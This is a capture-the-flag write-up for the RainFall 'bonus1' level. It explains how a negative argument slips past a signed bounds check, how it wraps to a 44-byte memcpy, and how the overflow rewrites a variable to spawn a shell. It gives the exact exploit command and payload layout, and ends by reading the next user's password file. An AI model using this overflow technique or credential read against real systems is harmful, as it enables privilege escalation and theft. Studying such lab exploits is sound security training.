## Phase 1: Reconnaissance

We find a binary named `bonus1` in the home directory

The program expects a number followed by a string. Missing arguments cause a crash, while ordinary inputs exit without printing anything:

```console
bonus1@RainFall:~$ ./bonus1 9 test
bonus1@RainFall:~$ echo $?
0
```

---

## Phase 2: Static Analysis

Using Ghidra, we recover the important code:

```c
int main(int argc, char **argv)
{
    char buffer[40];
    int count;

    count = atoi(argv[1]);

    if (count > 9)
        return 1;

    memcpy(buffer, argv[2], count * 4);

    if (count == 0x574f4c46)
        execl("/bin/sh", "sh", NULL);

    return 0;
}
```

The intended upper bound is `count <= 9`, which limits the copy to 36 bytes for normal positive values. However, the comparison is signed and does not reject negative values

At first, the success conditions appear incompatible:

- `count` must be at most 9 before `memcpy()`
- the same variable must equal `0x574f4c46` afterward

The copy destination and variable positions explain how to satisfy both:

```text
buffer = esp + 0x14
count  = esp + 0x3c

0x3c - 0x14 = 0x28 = 40 bytes
```

The four bytes immediately after `buffer` are the `count` variable

---

## Phase 3: Turning a Negative Count into a 44-Byte Copy

We use:

```text
count = -1073741813
```

As a 32-bit bit pattern, this value is `0xc000000b`. It passes the signed comparison because it is less than 9

The binary computes the copy size with a 32-bit `lea` instruction, so only the low 32 bits of `count * 4` are retained:

```text
(0xc000000b * 4) mod 2^32
= 0x0000002c
= 44
```

At the C language level, overflowing a signed integer is undefined behavior. What matters for this exploit is the actual instruction in this 32-bit binary: it wraps the result to 44 before passing it to `memcpy()` as `size_t`

The calculation can be checked with `resources/integer_wrap.py`

---

## Phase 4: Overwriting `count`

A 44-byte copy into the 40-byte buffer gives us exactly four bytes of overflow. We use them to replace `count` with the required value:

```text
target integer = 0x574f4c46
little endian  = \x46\x4c\x4f\x57
ASCII bytes    = F L O W
```

The payload is therefore:

```text
input offsets   size    contents
-------------   ----    ---------------------
0-39            40      padding
40-43           4       0x574f4c46 ("FLOW")
```

`resources/exploit.py` produces these 44 bytes

---

## Phase 5: Exploitation

We pass the wrapping integer as the first argument and the generated payload as the second:

```console
bonus1@RainFall:~$ ./bonus1 -1073741813 "$(python resources/exploit.py)"
$ whoami
bonus2
```

The initial negative value passes the range check. The wrapped multiplication makes `memcpy()` copy 44 bytes, and the final four bytes change `count` to `0x574f4c46`. The comparison succeeds and `execl()` starts a shell with bonus2 privileges

---

## Phase 6: Retrieving the Next Password

We read the password for bonus2:

```console
cat /home/user/bonus2/.pass
```

This reveals the flag for bonus2 and allows us to continue
